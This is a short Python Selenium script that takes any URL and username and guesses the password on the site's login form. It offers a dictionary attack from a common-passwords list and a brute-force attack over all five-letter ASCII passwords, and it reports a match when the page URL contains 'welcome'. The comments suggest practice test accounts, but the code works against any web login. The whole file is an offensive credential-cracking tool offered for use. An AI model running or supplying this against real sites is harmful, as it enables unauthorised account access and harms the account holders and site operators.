from selenium import webdriver
from selenium.webdriver.common.by import By
import time
from string import ascii_letters
import sys

url = input("Enter URL: ")
driver = webdriver.Edge()
driver.get(url)

print("\n")
print("(1) Dictianary Attack")
print("(2) Brute Force Attack")
attackMetod = input("choose the attack: ")

time.sleep(2)

username_field = driver.find_element(By.NAME, "username")
password_field = driver.find_element(By.NAME, "password")
submit_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")

# user0 for dictainary 
# user1 for brute force
print("\n")
username = input("Enter username: ")
username_field.send_keys(username)

match attackMetod:
    case "1":
        with open("10k-most-common.txt", "r") as file:
            for line in file:
                password = line.strip() 
                password_field.clear() 
                password_field.send_keys(password) 
                submit_button.click() 
                
                time.sleep(1) 

                if "welcome" in driver.current_url:  
                    print(f"Login successful with password: {password}")
                    break  
            else:
                print("No correct password found.")

    case "2":
        for i in ascii_letters:
            for l in ascii_letters:
                for j in ascii_letters:
                    for k in ascii_letters:
                        for m in ascii_letters:
                            password = f"{i}{l}{j}{k}{m}"
                            password_field.clear()
                            password_field.send_keys(password)
                            submit_button.click()
                            time.sleep(1)  
                    
                            if "welcome" in driver.current_url: 
                                print(f"Login successful with password: {password}")
                                sys.exit()
        else:
            print("Can't crack")
